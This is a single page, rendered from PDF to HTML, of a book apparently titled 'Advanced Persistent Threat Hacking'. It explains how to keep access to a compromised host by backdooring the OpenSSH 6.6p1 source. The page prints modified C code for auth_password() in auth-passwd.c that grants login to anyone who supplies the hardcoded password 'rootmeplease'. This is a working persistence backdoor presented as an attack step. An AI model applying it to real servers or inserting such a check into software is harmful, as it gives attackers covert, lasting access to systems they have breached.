<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1bd" class="pf w2 h2" data-page-no="1bd"><div class="pc pc1bd w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">422<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">In a scenario like this, if we ha<span class="_ _0"/>ve compromised the system and are not able </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">to directly communicate with any hosts on the Internet, we might still be able to </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">backdoor the system to maintain communications in the e<span class="_ _0"/>vent the vulnerability we </div><div class="t m0 x3 hd y15c ff4 fs7 fc0 sc0 ls0 ws0">initially exploited is x<span class="_ _0"/>ed. <span class="_ _0"/>W<span class="_ _2"/>e can do this by backdooring the SSH server on the </div><div class="t m0 x3 hd y15d ff4 fs7 fc0 sc0 ls0 ws0">host. In this example, we’<span class="_ _0"/>ll use the most up-to-date version of the Openssh software, </div><div class="t m0 x3 hd y271 ff4 fs7 fc0 sc0 ls0 ws0">which at the time of writing was Openssh 6.6p1.</div><div class="t m0 x4 hd y272 ff4 fs7 fc0 sc0 ls0 ws0">Start by do<span class="_ _0"/>wnloading the source and extract the archi<span class="_ _0"/>ve. If you look at the </div><div class="t m0 x3 hd y160 ff4 fs7 fc0 sc0 ls0 ws0">contents of the auth-passwd.c le, you’ll notice a comment like the follo<span class="_ _0"/>wing near </div><div class="t m0 x3 hd y161 ff4 fs7 fc0 sc0 ls0 ws0">the beginning of the source le:</div><div class="t m0 x3 h40 y280d fff fs5 fc0 sc0 ls0 ws0">/*</div><div class="t m0 x3 h40 y280e fff fs5 fc0 sc0 ls0 ws0"> * Tries to authenticate the user using password.  Returns true if</div><div class="t m0 x3 h40 y280f fff fs5 fc0 sc0 ls0 ws0"> * authentication succeeds.</div><div class="t m0 x3 h40 y2810 fff fs5 fc0 sc0 ls0 ws0"> */</div><div class="t m0 x3 h40 y2811 fff fs5 fc0 sc0 ls0 ws0">int</div><div class="t m0 x3 h40 y2812 fff fs5 fc0 sc0 ls0 ws0">auth_password(Authctxt *authctxt, const char *password)</div><div class="t m0 x3 h40 y2813 fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x4 hd y2814 ff4 fs7 fc0 sc0 ls15 ws0">Fantastic—the function auth_passw<span class="_ _0"/>ord() seems like a perfect candidate for </div><div class="t m0 x3 hd y2815 ff4 fs7 fc0 sc0 ls1a ws0">manipulation. If we look through the source, we see that this function should ultimately </div><div class="t m0 x3 hd y2816 ff4 fs7 fc0 sc0 ls1a ws0">return “ok” if the user has been authenticated successfully<span class="_ _2"/>, so let’<span class="_ _0"/>s add our rogue check, </div><div class="t m0 x3 hd y2817 ff4 fs7 fc0 sc0 ls1a ws0">like the end of the follo<span class="_ _0"/>wing example. Here you can see if the passw<span class="_ _0"/>ord sent from the </div><div class="t m0 x3 hd y2818 ff4 fs7 fc0 sc0 ls1a ws0">user is “rootmeplease,<span class="_ _2"/>” then we will assume they ha<span class="_ _0"/>ve authenticated successfully<span class="_ _3"/>.</div><div class="t m0 x3 h40 y2819 fff fs5 fc0 sc0 ls0 ws0">int</div><div class="t m0 x3 h40 y281a fff fs5 fc0 sc0 ls0 ws0">auth_password(Authctxt *authctxt, const char *password)</div><div class="t m0 x3 h40 y281b fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y281c fff fs5 fc0 sc0 ls0 ws0">        struct passwd * pw = authctxt-&gt;pw;</div><div class="t m0 x3 h40 y281d fff fs5 fc0 sc0 ls0 ws0">        int result, ok = authctxt-&gt;valid;</div><div class="t m0 x3 h40 y281e fff fs5 fc0 sc0 ls0 ws0">#if defined(USE_SHADOW) &amp;&amp; defined(HAS_SHADOW_EXPIRE)</div><div class="t m0 x3 h40 y281f fff fs5 fc0 sc0 ls0 ws0">        static int expire_checked = 0;</div><div class="t m0 x3 h40 y2820 fff fs5 fc0 sc0 ls0 ws0">#endif</div><div class="t m0 x3 h40 y2821 fff fs5 fc0 sc0 ls0 ws0">#ifndef HAVE_CYGWIN</div><div class="t m0 x3 h40 y2822 fff fs5 fc0 sc0 ls0 ws0">        if (pw-&gt;pw_uid == 0 &amp;&amp; options.permit_root_login != PERMIT_YES)</div><div class="t m0 x3 h40 y2823 fff fs5 fc0 sc0 ls0 ws0">                ok = 0;</div><div class="t m0 x3 h40 y2824 fff fs5 fc0 sc0 ls0 ws0">#endif</div><div class="t m0 x3 h40 y2825 fff fs5 fc0 sc0 ls0 ws0">        if (*password == ‘\0’ &amp;&amp; options.permit_empty_passwd == 0)</div><div class="t m0 x3 h40 y2826 fff fs5 fc0 sc0 ls0 ws0">                return 0;</div><div class="t m0 x3 h40 y2827 fff fs5 fc0 sc0 ls0 ws0">        if ( strcmp(password, "rootmeplease") == 0 )</div><div class="t m0 x3 h40 y2828 fff fs5 fc0 sc0 ls0 ws0">        {</div><div class="t m0 x3 h40 y2829 fff fs5 fc0 sc0 ls0 ws0">         return ok;</div><div class="t m0 x3 h40 y282a fff fs5 fc0 sc0 ls0 ws0">        }</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>